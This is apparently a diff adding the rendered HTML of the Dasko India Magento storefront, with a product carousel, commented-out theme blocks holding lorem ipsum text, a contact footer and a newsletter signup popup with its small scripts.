+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/s/s/sss001.jpg" alt="SSS001" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->SSS001<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/975/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1721.html" title="BC002" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/b/c/bc002_7.jpg" alt="BC002" style="width:100%" width="350" height="455" />
+                                                    <img class="hover-image" width="350" height="455" src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/b/c/bc002_7.jpg" alt="BC002" />                                            <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->BC002<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/925/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1772.html" title="SSS002" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/s/s/sss002.jpg" alt="SSS002" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->SSS002<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/976/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1773.html" title="SUS001" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/s/u/sus001.jpg" alt="SUS001" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->SUS001<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/977/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1805.html" title="BT001" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/b/t/bt001.jpg" alt="BT001" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->BT001<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/1011/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1744.html" title="PC009" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/p/c/pc009.jpg" alt="PC009" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->PC009<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/948/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                            <div class="column-item clearfix">
+                    <div class="item clearfix">
+                <div class="media-section ">
+                    <!--<a href="http://daskoindia.com/bc001-1745.html" title="PC010" class="product-image" data-images="">-->
+                        <img src="http://daskoindia.com/media/catalog/product/cache/1/small_image/350x455/9df78eab33525d08d6e5fb8d27136e95/p/c/pc010.jpg" alt="PC010" style="width:100%" width="350" height="455" />
+                                                                                                <!--</a>-->
+                    <div class="product-labels">
+                                                                                                                    </div>                
+                    <div class="hover-section">
+                        <div class="hover-links-wrapper a-center">
+                                                                                                </div>
+                    </div>
+                </div>
+                <div class="details-section">
+                                        <h2 class="product-name">
+                        <!--<a href="" title="">-->PC010<!--</a>-->
+                    </h2>
+                    <!--<div class="review rating-only">
+                                            </div>-->
+                                        <!--<div class="actions">
+                                                                                    <div class="add-to-bag">
+                                    <button type="button" title="BOOK NOW" class="button btn-cart btn-link" onclick="EGAjaxObject.ajaxCart('http://daskoindia.com/checkout/cart/add/uenc/aHR0cDovL2Rhc2tvaW5kaWEuY29tLw,,/product/949/form_key/0AFTDYOd13z0XaJW/')"><span><span>BOOK NOW</span></span></button>
+                                </div>
+                                                                        </div>-->
+                </div>
+            </div>
+                </div>
+                </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+jQuery(function($) {
+    var dynamicVar = 'product-list-ce26732511a2591a100d82cf922561ef';
+    var owlVar = dynamicVar.replace('-', '');
+    window[owlVar] = $(".product-list-ce26732511a2591a100d82cf922561ef");
+    window[owlVar].owlCarousel({
+        navigation: true,
+        lazyLoad: true,
+        autoPlay: false,
+        autoHeight: false,
+        itemsCustom: [[0,1], [320,1], [480,1], [751,3], [960,3], [1263,4]],
+        pagination: false,
+        rewindNav: true,
+        rewindSpeed: 600,
+        transitionStyle: 'fade',
+        navigationText: ["<span class='fa fa-angle-left'></span>", "<span class='fa fa-angle-right'></span>"]
+    });
+});
+//]]
+</script>
+</div></div></div></div>
+
+</div>
+
+
+
+<!--<div class="grid-container eg-homeblock">
+    <div class="block-title grid-full eg-tac eg-ttu">
+    <h3 class="eg-fwn">Featured Categories</h3>
+</div>
+<div class="clearfix"></div>
+<div class="block-content">
+    <div class="category-list-slider-wrapper eg-tac">
+        <div class="category-list-slider owl-carousel">
+                    <div class="item clearfix">
+                <a href="http://daskoindia.com/about-us.html" title="About us">
+                                    </a>
+                <div class="details-section">
+                    <span class="eg-ttu">Category</span>
+                    <h2 class="category-name eg-ttu">
+                        <a href="http://daskoindia.com/about-us.html" title="About us">About us</a>
+                    </h2>
+                    <div class="category-link eg-ttu">
+                        <div class="horizontal-separator separator-3"></div>
+                        <a href="http://daskoindia.com/about-us.html" title="About us">
+                            <span class="read-more">Read More</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+                    <div class="item clearfix">
+                <a href="http://daskoindia.com/products.html" title="Products">
+                                    </a>
+                <div class="details-section">
+                    <span class="eg-ttu">Category</span>
+                    <h2 class="category-name eg-ttu">
+                        <a href="http://daskoindia.com/products.html" title="Products">Products</a>
+                    </h2>
+                    <div class="category-link eg-ttu">
+                        <div class="horizontal-separator separator-3"></div>
+                        <a href="http://daskoindia.com/products.html" title="Products">
+                            <span class="read-more">Read More</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+                    <div class="item clearfix">
+                <a href="http://daskoindia.com/new-arrivals.html" title="New Arrivals">
+                                    </a>
+                <div class="details-section">
+                    <span class="eg-ttu">Category</span>
+                    <h2 class="category-name eg-ttu">
+                        <a href="http://daskoindia.com/new-arrivals.html" title="New Arrivals">New Arrivals</a>
+                    </h2>
+                    <div class="category-link eg-ttu">
+                        <div class="horizontal-separator separator-3"></div>
+                        <a href="http://daskoindia.com/new-arrivals.html" title="New Arrivals">
+                            <span class="read-more">Read More</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+                    <div class="item clearfix">
+                <a href="http://daskoindia.com/contact-us.html" title="Contact Us">
+                                    </a>
+                <div class="details-section">
+                    <span class="eg-ttu">Category</span>
+                    <h2 class="category-name eg-ttu">
+                        <a href="http://daskoindia.com/contact-us.html" title="Contact Us">Contact Us</a>
+                    </h2>
+                    <div class="category-link eg-ttu">
+                        <div class="horizontal-separator separator-3"></div>
+                        <a href="http://daskoindia.com/contact-us.html" title="Contact Us">
+                            <span class="read-more">Read More</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+                </div>
+    </div>
+</div>
+<script type="text/javascript">
+    var catlistslider = jQuery('.category-list-slider');
+    catlistslider.owlCarousel({
+        lazyLoad: true,
+        responsive: true,
+        itemsCustom: [[0, 1], [320, 1], [480, 2], [751, 3], [960, 3], [1263, 4]],
+        responsiveRefreshRate: 50,
+        autoPlay: true,
+        stopOnHover: true,
+        rewindNav: true,
+        rewindSpeed: 600,
+        pagination: false,
+        transitionStyle: 'fade',
+        navigation: true,
+        navigationText: ["<span class='fa fa-angle-left'></span>", "<span class='fa fa-angle-right'></span>"]
+    });
+</script>
+
+</div>
+
+<div class="grid-container eg-homeblock">
+    <div class="eg-cmsblock eg-cmsblock-home electronic-block-section eg-fullwidth clearfix" style="background-image:url(http://daskoindia.com/media/wysiwyg/elegento/home/electronic-image.jpg);background-repeat:no-repeat;background-size:cover;background-position:0% 0%;">
+    <div class="electronic-block-container clearfix" style="margin: 60px 0;">
+        <div class="container">
+            <div class="grid-container">
+                <div class="grid12-6 grid-xs-full grid-sm-full a-center" style="margin:0 auto;float:none;background-color:#fff;padding:30px;">
+                    <div class="electronic-block">
+                        <p class="eg-ttu theme-color" style="font-weight: 700;font-size:13px;letter-spacing: 4px;margin-bottom:-3px;">CHECK OUT OUR BRAND NEW</p>
+                        <h3 class="eg-ttu" style="font-family: 'Bodoni MT';margin-bottom: 20px;">A completely new product line</h3>
+                        <p class="" style="font-size: 13px; line-height: 23px; color: #767676;">
+                            Phasellus egestas, nunc non consectetur hendrerit, risus mauris cursus velit, et condimentum nisi enim in eros. Nam ullamcorper neque non erat elementum vulputate. Nullam dignissim lobortis interdum. 
+                        </p>
+                        <p class="eg-fsi" style="color: #767676;font-size:13px;line-height:23px;border:1px solid #ddd;border-width:1px 0;padding:28px 0;margin:30px 0;position:relative;">
+                            <span class="fa fa-quote-left" style="position:absolute;top:15px;left:0px; font-size:40px;opacity:0.1"></span>
+                            Duis dictum, neque at hendrerit euismod, elit nulla mattis mi, vel auctor sem dolor nec nisl. Etiam hendrerit arcu pretium, aliquet nulla eu, placerat ipsum. Nullam suscipit nulla a sapien gravida euismod.
+                        </p>
+
+                        <div class="banner-column-wrapper">
+                            <div class="banner-column">
+                                <div class="clearfix">
+    <ul class="social-icons clearfix" style="margin-bottom:10px;">
+        <li>
+            <a href="https://twitter.com/share?url=http://www.soaptheme.net/magento/royal/&amp;text=RoyalTheme" class="link-twitter tooltipster" target="_blank" title="Share On Twitter">
+                <span class="fa fa-twitter"></span>
+                <svg width="38" height="38" xmlns="http://www.w3.org/2000/svg" class="circle">
+                    <circle cx="19" cy="19" r="18" fill="rgba(255,255,255,0)" stroke="#000000"></circle>
+                </svg>
+            </a>
+        </li>
+        <li>
+            <a href="http://www.facebook.com/sharer.php?u=http://www.soaptheme.net/magento/royal/&amp;u=http://www.soaptheme.net/magento/royal/&amp;t=RoyalTheme" class="link-facebook tooltipster" title="Share On Facebook" target="_blank">
+                <span class="fa fa-facebook"></span>
+                <svg width="38" height="38" xmlns="http://www.w3.org/2000/svg" class="circle">
+                    <circle cx="19" cy="19" r="18" fill="rgba(255,255,255,0)" stroke="#000000"></circle>
+                </svg>
+            </a>
+        </li>
+        <li>
+            <a href="http://pinterest.com/pin/create/button/?url=http://www.soaptheme.net/magento/royal/&amp;description=RoyalTheme" class="link-pinterest tooltipster" title="Share On Pinterest" target="_blank">
+                <span class="fa fa-pinterest"></span>
+                <svg width="38" height="38" xmlns="http://www.w3.org/2000/svg" class="circle">
+                    <circle cx="19" cy="19" r="18" fill="rgba(255,255,255,0)" stroke="#000000"></circle>
+                </svg>
+            </a>
+        </li>
+        <li>
+            <a href="http://plus.google.com/share?url=http://www.soaptheme.net/magento/royal/&amp;title=RoyalTheme" class="link-google-plus tooltipster" title="Share On Google" target="_blank">
+                <span class="fa fa-google-plus"></span>
+                <svg width="38" height="38" xmlns="http://www.w3.org/2000/svg" class="circle">
+                    <circle cx="19" cy="19" r="18" fill="rgba(255,255,255,0)" stroke="#000000"></circle>
+                </svg>
+            </a>
+        </li>
+        <li>
+            <a href="mailto:elegento@soaptheme.net?subject=RoyalTheme&amp;body=http://www.soaptheme.net/magento/royal/" class="link-email tooltipster" title="Share On Mail" target="_blank">
+                <span class="fa fa-envelope-o"></span>
+                <svg width="38" height="38" xmlns="http://www.w3.org/2000/svg" class="circle">
+                    <circle cx="19" cy="19" r="18" fill="rgba(255,255,255,0)" stroke="#000000"></circle>
+                </svg>
+            </a>
+        </li>
+    </ul>
+</div>
+                            </div>
+                        </div>
+                    </div> 
+                </div>
+            </div>
+        </div>
+    </div> 
+</div>
+</div>
+
+<div class="grid-container eg-homeblock">
+    <div class="electronic-block-section our-services">
+    <div class="block-title grid-full eg-tac eg-ttu">
+        <h3 class="service-block-title eg-fwn">Our Services</h3>
+    </div>
+    <div class="clearfix"></div>
+    <div class="block-content">
+        <div class="electronic-block-container">
+            <div class="">
+                <div class="grid12-4 grid-xs-full">
+                    <div class="column-top electronic-block clearfix" style="margin-bottom:30px;">
+                        <div class="icon-wrapper f-left theme-hover-bg-color" data-hover-color="white" style="margin-right:15px;width: 70px;height: 70px;border-radius: 100px; background-color: #f5f5f5;text-align: center;line-height: 70px;font-size: 30px;color: #4e4e4e;">
+                            <span class="fa fa-truck" style="padding-left: 5px;">&nbsp;</span>
+                        </div>
+                        <div class="description-wrapper" style="margin-left:95px;">
+                            <h3 style="color:#252525;font-size:16px;">FREE DELIVERY</h3>
+                            <p style="font-size:13px;line-height:22px;color:#808080;">In congue, justo non cursus adipiscing, dui nibh scelerisque justo, quis pretium turpis.</p>
+                        </div>
+                    </div>
+
+                    <div class="column-top electronic-block clearfix" style="margin-bottom:30px;">
+                        <div class="icon-wrapper f-left theme-hover-bg-color" data-hover-color="white" style="margin-right:15px;width: 70px;height: 70px;border-radius: 100px; background-color: #f5f5f5;text-align: center;line-height: 70px;font-size: 30px;color: #4e4e4e;">
+                            <span class="fa fa-truck" style="padding-left: 5px;">&nbsp;</span>
+                        </div>
+                        <div class="description-wrapper" style="margin-left:95px;">
+                            <h3 style="color:#252525;font-size:16px;">FREE DELIVERY</h3>
+                            <p style="font-size:13px;line-height:22px;color:#808080;">In congue, justo non cursus adipiscing, dui nibh scelerisque justo, quis pretium turpis.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid12-4 grid-xs-full">
+                    <div class="column-top electronic-block clearfix" style="margin-bottom:30px;">
+                        <div class="icon-wrapper f-left theme-hover-bg-color" data-hover-color="white" style="margin-right:15px;width: 70px;height: 70px;border-radius: 100px; background-color: #f5f5f5;text-align: center;line-height: 70px;font-size: 30px;color: #4e4e4e;">
+                            <span class="fa fa-truck" style="padding-left: 5px;">&nbsp;</span>
+                        </div>
+                        <div class="description-wrapper" style="margin-left:95px;">
+                            <h3 style="color:#252525;font-size:16px;">FREE DELIVERY</h3>
+                            <p style="font-size:13px;line-height:22px;color:#808080;">In congue, justo non cursus adipiscing, dui nibh scelerisque justo, quis pretium turpis.</p>
+                        </div>
+                    </div>
+
+                    <div class="column-top electronic-block clearfix" style="margin-bottom:30px;">
+                        <div class="icon-wrapper f-left theme-hover-bg-color" data-hover-color="white" style="margin-right:15px;width: 70px;height: 70px;border-radius: 100px; background-color: #f5f5f5;text-align: center;line-height: 70px;font-size: 30px;color: #4e4e4e;">
+                            <span class="fa fa-truck" style="padding-left: 5px;">&nbsp;</span>
+                        </div>
+                        <div class="description-wrapper" style="margin-left:95px;">
+                            <h3 style="color:#252525;font-size:16px;">FREE DELIVERY</h3>
+                            <p style="font-size:13px;line-height:22px;color:#808080;">In congue, justo non cursus adipiscing, dui nibh scelerisque justo, quis pretium turpis.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid12-4 grid-xs-full">
+                    <div class="column-top electronic-block clearfix" style="margin-bottom:30px;">
+                        <div class="icon-wrapper f-left theme-hover-bg-color" data-hover-color="white" style="margin-right:15px;width: 70px;height: 70px;border-radius: 100px; background-color: #f5f5f5;text-align: center;line-height: 70px;font-size: 30px;color: #4e4e4e;">
+                            <span class="fa fa-truck" style="padding-left: 5px;">&nbsp;</span>
+                        </div>
+                        <div class="description-wrapper" style="margin-left:95px;">
+                            <h3 style="color:#252525;font-size:16px;">FREE DELIVERY</h3>
+                            <p style="font-size:13px;line-height:22px;color:#808080;">In congue, justo non cursus adipiscing, dui nibh scelerisque justo, quis pretium turpis.</p>
+                        </div>
+                    </div>
+
+                    <div class="column-top electronic-block clearfix" style="margin-bottom:30px;">
+                        <div class="icon-wrapper f-left theme-hover-bg-color" data-hover-color="white" style="margin-right:15px;width: 70px;height: 70px;border-radius: 100px; background-color: #f5f5f5;text-align: center;line-height: 70px;font-size: 30px;color: #4e4e4e;">
+                            <span class="fa fa-truck" style="padding-left: 5px;">&nbsp;</span>
+                        </div>
+                        <div class="description-wrapper" style="margin-left:95px;">
+                            <h3 style="color:#252525;font-size:16px;">FREE DELIVERY</h3>
+                            <p style="font-size:13px;line-height:22px;color:#808080;">In congue, justo non cursus adipiscing, dui nibh scelerisque justo, quis pretium turpis.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+
+<div class="grid-container eg-homeblock">
+    
+</div>--></div>                    </div>
+                    <div class="postscript"></div>
+                </div>
+            </div>
+            <!--<div class="custom-block-footertop-container">
+    </div>-->
+
+<div class="footer-container">
+    
+    <!--    <div class="footer-top-after-container section-container">
+        <div class="footer-top-after footer container">
+            <div class="clearfix">
+                            </div>
+        </div>
+    </div>-->
+        
+        <div class="footer-main-container section-container">
+        <div class="footer-main footer container">
+            <div class="clearfix">
+                <div class="grid12-6 grid-xs-full block_footer_main_col1"><div class="cms-block">
+    <div class="cms-block-content">
+        <div class="cms-block-content-wrapper">
+          <!-- <div class="aboutus-img theme-color" style="font-size:71px;line-height:72px;">
+                <a class="f-left theme-color" href="#" style="margin-right:18px;"><img src="media/wysiwyg/aboutlogo.png" /></a>
+            </div>-->
+            <div class="aboutus-title">
+                <h5 class="eg-ttu">About <span class="theme-color">Dasko </span></h5>
+                <p style="font-size: 11px;line-height: 18px;color:#767676;">Dasko a venture of AB Micro Electronics involved in supporting Indian industry.</p>
+            </div>
+            <div class="clearfix"></div>
+            <div class="aboutus-content" style="margin: 19px 0 0;text-align: center;padding: 16px 10px 10px;border: 1px solid #3F3F3F;line-height: 22px;color: #767676;letter-spacing: 1px;">
+                <address class="address-company" style="margin-bottom:0;">
+
+<p>A-18, Dayanand Colony, Lajpat Nagar -IV,<br>
+New Delhi-110024<br>
+<b>Email:</b> daskoindia@gmail.com<br>
+<b>Phone:</b> +91-11-49052053<br>
+<b>Fax:</b> +91-11-49052053</p>
+
+                <ul class="social-icons footer-social-icons">
+                    <li>
+                        <a href="https://twitter.com/share?url=http://www.soaptheme.net/magento/royal/&amp;text=RoyalTheme" class="link-twitter tooltipster" target="_blank" title="Share On Twitter">
+                            <span class="fa fa-twitter"></span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="http://www.facebook.com/sharer.php?u=http://www.soaptheme.net/magento/royal/&amp;u=http://www.soaptheme.net/magento/royal/&amp;t=RoyalTheme" class="link-facebook tooltipster" title="Share On Facebook" target="_blank">
+                            <span class="fa fa-facebook"></span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="http://pinterest.com/pin/create/button/?url=http://www.soaptheme.net/magento/royal/&amp;description=RoyalTheme" class="link-pinterest tooltipster" title="Share On Pinterest" target="_blank">
+                            <span class="fa fa-pinterest"></span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="http://plus.google.com/share?url=http://www.soaptheme.net/magento/royal/&amp;title=RoyalTheme" class="link-google-plus tooltipster" title="Share On Google" target="_blank">
+                            <span class="fa fa-google-plus"></span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="mailto:enteryour@addresshere.com?subject=RoyalTheme&amp;body=Check%20this%20out:%20http://www.soaptheme.net/magento/royal/" class="link-email tooltipster" title="Share On Mail" target="_blank">
+                            <span class="fa fa-envelope-o"></span>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div> 
+    </div>
+</div></div><div class="grid12-6 grid-xs-full block_footer_main_col2"><div class="cms-block">
+    <div class="cms-block-title">
+        <h6>Informations</h6>
+    </div>
+    <div class="cms-block-content clearfix">
+        <ul class="grid12-6 no-padding-left" style="line-height:30px;font-size:13px;">
+            <li><a href="http://daskoindia.com/about_us">About us</a></li>
+            <li><a href="#">Our office</a></li>
+            <li><a href="#">Delivery</a></li>
+            <li><a href="#">Store</a></li>
+            <li><a href="#">Guarantee</a></li>
+            <li><a href="#">Buy gift cards</a></li>
+            <li><a href="#">Returns</a></li>
+        </ul>
+
+        <ul class="grid12-6 no-padding-right" style="line-height:30px;font-size:13px;">
+            <li><a href="#">Track your order</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Conditions</a></li>
+            <li><a href="http://daskoindia.com/contacts">Contact us</a></li>
+            <li><a href="#">Manufacturers</a></li>
+            <li><a href="#">New Brands</a></li>
+            <li><a href="#">News</a></li>
+        </ul>
+    </div> 
+</div></div>            </div>
+        </div>
+    </div>
+        
+        <div class="footer-bottom-container section-container">
+        <div class="footer-blocks footer container">
+            <div class="clearfix">
+                <div class="footer-blocks-top">
+                                                </div>
+                            </div>
+        </div>
+        <div class="footer-bottom footer container">
+            <div class="clearfix">
+                <div class="grid12-6 grid-xs-full no-padding">
+                                        <p class="footer-copyright">&copy; Created  by <span><a href="http://daskoindia.com/" class="theme-color">daskoindia</a></span>. All right reserved</p>
+                </div>
+
+                <div class="grid12-6 grid-xs-full no-padding">   
+                                            <div class="item item-right"></div>
+                       
+                </div>
+            </div>
+        </div>
+    </div>
+        
+    <a href="#top" id="scroll-to-top"><span class="fa fa-angle-up"></span></a>
+
+</div>
+
+<div class="custom-block-footerbottom-container">
+    </div>                        <script type="text/javascript" src="http://daskoindia.com/js/elegento/elegento.js"></script>
+
+<div id="egnewsletter_popup_container" class="egnewsletter-popup-container">
+    <div class="egnewsletter-frame eg-block block-style-1">
+        <style type='text/css' scoped>
+            .egnewsletter-popup-container .egnewsletter-frame {width: 750px; }
+                    </style>
+        <a href="javascript:void(0);" class="egnewsletter-close" id="egnewsletter_close">
+            <span class="icon-royal icon-cross"></span>
+        </a>
+        <div class="block block-subscribe">
+            <div class="block-title eg-tac no-border no-margin">
+                <h4 class="eg-ttu eg-fwn">Subscribe</h4>
+                <div class="horizontal-separator separator-4"></div>
+            </div>
+            <form action="http://daskoindia.com/newsletter/subscriber/new/" method="post" id="egnewsletter-popup">
+                <div class="block-content">
+                    <p class="newsletter-description eg-tac">Sign up to get exclusive offers from<br />
+our favorite brands and to be well up in the news.</p>
+                    <ul class="form-list" style="list-style:none;">
+                                                                                                                                                                        <li>
+                            <label for="egnl-email" class="required"><em>*</em>Email:</label>
+                            <div class="input-box">
+                                                                <input type="text" name="email" id="egnl-email" placeholder="Your email address *" class="input-text required-entry validate-email" />
+                            </div>
+                        </li>
+                        <li class="eg-tac">
+                            <input type="submit" value="Subscribe" title="Subscribe" class="button btn-subscribe" />
+                        </li>
+                    </ul>
+
+                    <div class="input-box">
+                        <input type="checkbox" class="disable-popup" id="disable_popup" />
+                        <label for="disable_popup" class="disable-popup">Don't show this popup again</label>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    function egHideNewsletterModal() {
+        $('egnewsletter_popup_container').fade({ duration: 0.5, from: 1, to: 0 });
+
+        var url = "http://daskoindia.com/newsletter/index/hidePopup/";
+        if ($('disable_popup').checked) {
+            url = "http://daskoindia.com/newsletter/index/disablePopup/";
+        }
+
+        new Ajax.Request(url, {method: "post"});
+    }
+    
+    var egNewsletterPopupForm = new VarienForm('egnewsletter-popup');
+    egNewsletterPopupForm.validator.options.onFormValidate = function(result, form){
+        if (result) {
+            egHideNewsletterModal();
+        }
+    };
+
+    Event.observe('egnewsletter_close', 'click', function(event) {
+        egHideNewsletterModal();
+    });
+
+    Event.observe('egnewsletter_popup_container', 'click', function(event) {
+        if (!Element.descendantOf(event.target, 'egnewsletter_popup_container')) {
+            egHideNewsletterModal();
+        }
+    });
+//]]>
+</script>
+        </div>
+    </div>
+</div>
+</body>
+</html>
